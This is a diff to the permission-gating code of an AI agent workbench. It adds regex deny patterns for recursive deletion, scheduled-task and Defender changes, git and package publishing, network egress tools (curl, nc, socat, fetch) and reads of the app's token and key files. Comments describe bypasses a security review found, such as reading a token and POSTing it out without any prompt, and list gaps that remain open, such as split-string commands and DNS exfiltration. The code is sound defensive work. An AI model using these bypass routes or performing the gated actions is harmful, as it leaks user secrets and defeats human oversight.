@@ -306,6 +306,18 @@ const STEWARD_EXEMPT_CONTENT_GROUPS = Object.freeze([
   Object.freeze({ category: 'delete_data', floor: false, patterns: Object.freeze([
     /\brm\s+-[a-z]*r/i, /\brmdir\b/i, /\bdel\s+\/[sq]/i,
     /\bremove-item\b[^\n]{0,200}?-(recurse|force)/i,
+    // 安全走查 S2:递归删除的缩写与 API 形式(下面全是【只加不改】,上面四条逐字未动)。
+    //   · PowerShell 的参数前缀缩写与别名:Remove-Item … -r / -rec(-Recurse 的任意前缀)、-fo(-Force 的无歧义缩写;-f 与 -Filter 歧义,不是合法写法);
+    //     别名 ri / del / erase / rd / rm 同样吃这些开关;
+    //   · GNU rm 把开关放在操作数后面(`rm dir -rf`,上面那条只认紧跟 rm 的开关)、argv 数组形态(['rm','-rf',…]);
+    //   · cmd 的 rd /s、erase /s;find … -delete;
+    //   · 脚本语言的 API:python shutil.rmtree、node 的 .rm / .rmSync / .rmdir(带 recursive;`require('fs').rmSync(…)` 这种链式写法里没有 `fs.` 前缀,所以不锚 fs)、rimraf、.NET [IO.Directory]::Delete。
+    /\b(?:remove-item|ri|del|erase|rd|rmdir|rm)\b[^\n]{0,200}?\s-(?:r|re|rec|recu|recur|recurs|recurse)(?=[\s:]|$)/i,
+    /\b(?:remove-item|ri|del|erase|rd)\b[^\n]{0,200}?\s-fo(?:r|rc|rce)?(?=[\s:]|$)/i,
+    /\brm\b[^\n]{0,200}?\s-[a-z]*r[a-z]*(?=\s|$)/i, /\brm['"]?\s*,\s*['"]-[a-z]*r/i,
+    /\b(?:rd|erase)\s+\/[sq]\b/i, /\bfind\b[^\n]{0,200}?\s-delete\b/i,
+    /\bshutil\.rmtree\b/i, /\brimraf\b/i, /\.(?:rm|rmSync|rmdir|rmdirSync)\s*\([^\n]{0,300}?recursive/i,
+    /\[\s*(?:system\.)?io\.directory\s*\]\s*::\s*delete\b/i,
   ]) }),
   Object.freeze({ category: 'delete_data', floor: true, patterns: Object.freeze([
     /\bformat\s+[a-z]:/i, /\bdiskpart\b/i, /\bmkfs\b/i,
@@ -316,6 +328,15 @@ const STEWARD_EXEMPT_CONTENT_GROUPS = Object.freeze([
     /\b(set|new|remove)-itemproperty\b[^\n]{0,200}?hk(lm|cu)/i,
     /\bnetsh\b/i, /\bshutdown\b/i, /\bbcdedit\b/i,
     /\b(restart|stop)-computer\b/i,
+    // 安全走查 S2:持久化 / 提权 / 改系统服务与执行策略(都是「装了就一直在」的系统级改动,与注册表同属底线,只能用户亲自按):
+    //   schtasks /create|/change|/run、Register-ScheduledTask / Set-ScheduledTask / Register-ScheduledJob、Set-ExecutionPolicy、
+    //   sc create|config|delete|failure(服务)、New-Service / Set-Service、Defender 排除项 Add/Set-MpPreference、
+    //   reg.exe 的 add/delete(上面的 reg add 认不出 reg.exe)与 import/copy/load/unload/restore/save。
+    /\bschtasks(?:\.exe)?\b[^\n]{0,200}?\/(?:create|change|run)\b/i,
+    /\b(?:register|set)-scheduled(?:task|job)\b/i, /\bset-executionpolicy\b/i,
+    /\bsc(?:\.exe)?\s+(?:\\\\\S+\s+)?(?:create|config|delete|failure)\b/i,
+    /\b(?:new|set)-service\b/i, /\b(?:add|set)-mppreference\b/i,
+    /\breg(?:\.exe)?\s+(?:add|delete|import|copy|load|unload|restore|save)\b/i,
   ]) }),
   // ③ 安装卸载软件
   Object.freeze({ category: 'install', floor: false, patterns: Object.freeze([
@@ -332,11 +353,17 @@ const STEWARD_EXEMPT_CONTENT_GROUPS = Object.freeze([
     /\binvoke-(webrequest|restmethod)\b[^\n]{0,300}?(-method\s*(post|put|patch|delete)\b|-body\b)/i,
   ]) }),
   Object.freeze({ category: 'outbound_send', floor: true, patterns: Object.freeze([
-    /\b(sendmail|mailx)\b/i, /\bmail\s+-s\b/i,
+    /\b(sendmail|mailx)\b/i, /\bmail\s+-s\b/i, /\bsend-mailmessage\b/i,
   ]) }),
   // ⑤ 把改动推出去(git push 不可撤销地外溢到远端)
   Object.freeze({ category: 'push_remote', floor: false, patterns: Object.freeze([
     /\bgit\s+push\b/i,
+    // 安全走查 S2:`git.exe push`、`git -c k=v push`、`git -C dir push`、`git --no-pager push`(开关夹在 git 与 push 之间,上面的 `git\s+push` 认不出),
+    // argv 数组形态(['git','push']);包管理器 / 镜像仓库的发布同属「把东西推出去」:npm|pnpm|yarn publish、twine upload、cargo publish、docker push、nuget push、gem push、vsce publish。
+    /\bgit(?:\.exe)?["']?(?:\s+(?:-[cC]\s+(?:[^\s"']|"[^"\n]*"|'[^'\n]*')+|--[\w-]+(?:=(?:[^\s"']|"[^"\n]*"|'[^'\n]*')+)?|-[a-zA-Z]\b))*\s+push\b/i,
+    /\bgit['"]?\s*,\s*['"]push\b/i,
+    /\b(?:npm|pnpm|yarn)(?:\.cmd)?\s+(?:[\w:@./-]+\s+)*?publish\b/i,
+    /\b(?:twine\s+upload|cargo\s+publish|docker\s+push|(?:dotnet\s+)?nuget\s+push|gem\s+push|vsce\s+publish)\b/i,
   ]) }),
 ]);
 // 127 波 2-quater B1 ②:灾难性删除目标(主会话在拍板 1 之外另加的底线项)。`rm -rf ./build` 与 `rm -rf /`
@@ -415,6 +442,62 @@ function stewardAutoAskIndirect(input) {
   if (input == null) return false;
   const composed = stewardExemptInputText(input).slice(0, STEWARD_EXEMPT_INPUT_CHARS);
   return !!composed && STEWARD_AUTO_ASK_INDIRECT_PATTERNS.some(pattern => pattern.test(composed));
+}
+// 安全走查 S2(「智能自动」档对 exec 工具是正则黑名单,实测一串写法直接绕过):不改成白名单(那是产品形态变更),而是把报告里实测绕过的那些写法补进判据。
+// 分两处,口径刻意分开:
+//   · 递归删除的缩写与 API 形式、git 的 -c/-C/.exe push、npm|pnpm|yarn publish 等发布、schtasks /create、Register-ScheduledTask、Set-ExecutionPolicy、
+//     sc create、reg.exe add:补进上面 STEWARD_EXEMPT_CONTENT_GROUPS 的【原有类别】(删数据 / 推送远端 / 改系统),只加不改 —— 管家代批的八道闸、类别标签、
+//     底线标记原样适用;
+//   · 网络外发(下面 EGRESS)与读数据根里的密钥文件(下面 DATAROOT):【不进】上面的豁免组 —— 豁免组的语义是「这条命令属于那五类不可撤销的动作」,
+//     而 unit/steward-exempt.test.js 钉着「纯 GET 读取(curl -s https://… / Invoke-WebRequest … -OutFile)不属于对外发送」;GET 照样能把数据放进网址外传
+//     (实测 python urllib POST、node fetch、curl.exe GET、Invoke-WebRequest 全部无提示放行),所以另立两张【只管智能自动停问】的表,
+//     与 STEWARD_AUTO_ASK_INDIRECT_PATTERNS 同一个用法:nativeToolGate 命中 → 停下来问;管家(13l)对这一类不代批,只能用户亲自按。
+// 误伤纪律:`git status/diff/log`、`npm test`、`node script.js`、读本地文件这些日常开发动作一条都不命中(unit/auto-exec-egress-gate.test.js 钉着样本)。
+// 已知没覆盖(诚实):把命令拆成变量再拼(`$c='cu'+'rl'; & $c …`,强信号部分由 INDIRECT 表管)、先写脚本文件再运行、DNS 外传(ping <数据>.evil.com)、
+// git clone / pull / ls-remote 把数据放进远端网址 —— 要治得做白名单或执行沙箱;由执行闸、审计与线程档位兜底。
+const STEWARD_AUTO_ASK_EGRESS_PATTERNS = Object.freeze([
+  // PowerShell / Windows 自带的下载上传:Invoke-WebRequest 及别名 iwr、Invoke-RestMethod 及别名 irm、BITS、.NET 的 WebClient / HttpClient / WebRequest / TcpClient
+  /\b(?:invoke-webrequest|invoke-restmethod|iwr|irm)\b/i,
+  /\bstart-bitstransfer\b/i, /\bbitsadmin(?:\.exe)?\b[^\n]{0,80}?\/transfer/i, /\bcertutil(?:\.exe)?\b[^\n]{0,120}?-urlcache/i,
+  /\bnet\.webclient\b/i, /\bnet\.webrequest\b/i, /\bnet\.http\.httpclient\b/i, /\bnet\.sockets\.tcpclient\b/i,
+  // curl / wget(含 .exe;GET 同样能带数据出去,所以不论方法)
+  /\bcurl(?:\.exe)?\b/i, /\bwget(?:\.exe)?\b/i,
+  // python:urllib.request / urllib2 / urlopen、requests、http.client / httplib、httpx、aiohttp、裸 socket、ftplib / smtplib / paramiko
+  /\burllib\.request\b/i, /\burllib2\b/i, /\burlopen\s*\(/i, /\bfrom\s+urllib\s+import\s+[^\n]*\brequest\b/i,
+  /\b(?:import|from)\s+requests\b/i, /\brequests\.(?:get|post|put|patch|delete|head|request|session)\b/i,
+  /\bhttp\.client\b/i, /\bhttplib\b/i, /\bhttpx\b/i, /\baiohttp\b/i, /\bsocket\.(?:socket|create_connection)\b/i,
+  /\bftplib\b/i, /\bsmtplib\b/i, /\bparamiko\b/i,
+  // node:fetch(、http(s).request / .get(、require/import 'http' 'https' 'net' 'tls' 'dgram' 'http2'、axios、node-fetch、XMLHttpRequest、net.connect
+  /\bfetch\s*\(/i, /\bhttps?\.(?:request|get)\s*\(/i,
+  /\brequire\s*\(\s*['"](?:node:)?(?:https?|net|tls|dgram|http2)['"]\s*\)/i,
+  /\bimport\b[^\n]{0,80}?\bfrom\s+['"](?:node:)?(?:https?|net|tls|dgram|http2)['"]/i,
+  /\baxios\b/i, /\bnode-fetch\b/i, /\bXMLHttpRequest\b/i, /\bnet\.(?:connect|createConnection)\s*\(/i,
+  // 命令行外联:nc / ncat / netcat / socat、scp / sftp / ftp / tftp、ssh <主机>(管道外传 `cat f | ssh host 'cat > x'`)、rsync 到远端、nslookup / Resolve-DnsName(DNS 外传)
+  /\b(?:nc|ncat|netcat|socat)(?:\.exe)?\b/i, /\b(?:scp|sftp|ftp|tftp)(?:\.exe)?\b/i, /\bssh(?:\.exe)?\s+\S/i,
+  /\brsync\b[^\n]{0,200}?(?:\s[\w.@-]+@[\w.-]+:|rsync:\/\/)/i, /\b(?:nslookup|resolve-dnsname)\b/i,
+]);
+// 读如意数据根里的密钥 / 状态文件:runtime.json(WCW token)、<数据根>\config.json(明文 provider 密钥)及其备份族、会话 / 记忆 / 计费 / 审计 / 管家 / 事项 / 调度。
+// 文件工具层早已把这些封死(03 isSensitiveDataPath),但 exec 工具(script_run / powershell_run)直接读盘,实测把 token 读出来 POST 到外部端口全程零弹窗。
+// 单独的 `config.json` 在普通工程里太常见,所以只认「数据根目录名后面跟着这些名字」「runtime.json」「config.json 备份族」与数据根 / token 的环境变量名。
+const STEWARD_AUTO_ASK_DATAROOT_PATTERNS = Object.freeze([
+  /\bruntime\.json\b/i,
+  /(?:\.ruyi-workbench|\.win-claude-workbench)[^\n]{0,160}?(?:\b(?:config|runtime)\.json\b|[\\/'"\s,](?:sessions|memory|usage|logs|steward|missions|scheduler|engine-transcripts|claude-settings-sync)\b)/i,
+  /\bconfig\.json\.(?:prev|bak)/i,
+  /\b(?:RUYI_HOME|WIN_CLAUDE_WORKBENCH_HOME|WCW_TOKEN)\b/,
+]);
+// 这两张表只扫【命令类】工具的入参。编排类工具(orchestrate_agents / spawn_agent)的入参是给子代理的任务描述文字 —— 「重构一下 fetch( ) 封装」「用 curl 测接口」
+// 在那里是散文,不是命令;子代理自己的每一步工具调用在它自己的回合里照样过闸。
+const STEWARD_AUTO_ASK_PROSE_TOOLS = Object.freeze(['orchestrate_agents', 'spawn_agent']);
+// 返回 '' / 'egress' / 'dataroot'(同时命中报 dataroot —— 读密钥更要紧)。toolName 可缺省(= 扫)。
+function stewardAutoAskSensitiveKind(toolName, input) {
+  if (input == null) return '';
+  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
+  if (STEWARD_AUTO_ASK_PROSE_TOOLS.includes(bare)) return '';
+  const composed = stewardExemptInputText(input).slice(0, STEWARD_EXEMPT_INPUT_CHARS);
+  if (!composed) return '';
+  if (STEWARD_AUTO_ASK_DATAROOT_PATTERNS.some(pattern => pattern.test(composed))) return 'dataroot';
+  if (STEWARD_AUTO_ASK_EGRESS_PATTERNS.some(pattern => pattern.test(composed))) return 'egress';
+  return '';
 }
 // 107-S1 ③(46 号文 §5 ⑦b H2 实验 E1):**删数据类只在目标是相对路径时才可代批**。
 // 实测 `Remove-Item C:\Users -Recurse -Force`、`rm -rf /home/me/notes`、
